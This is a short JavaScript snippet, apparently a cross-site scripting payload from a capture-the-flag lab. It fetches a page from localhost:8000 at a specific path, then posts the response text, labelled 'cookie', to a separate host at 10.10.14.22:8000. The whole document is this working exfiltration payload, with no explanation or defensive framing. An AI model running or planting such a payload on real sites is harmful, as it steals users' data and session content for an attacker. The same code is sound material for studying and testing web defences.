var req1 = new XMLHttpRequest();
req1.open('GET', 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65', false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
var params = "cookie=" + encodeURIComponent(response);
req2.open('POST', 'http://10.10.14.22:8000/tester', true);
req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req2.send(params);
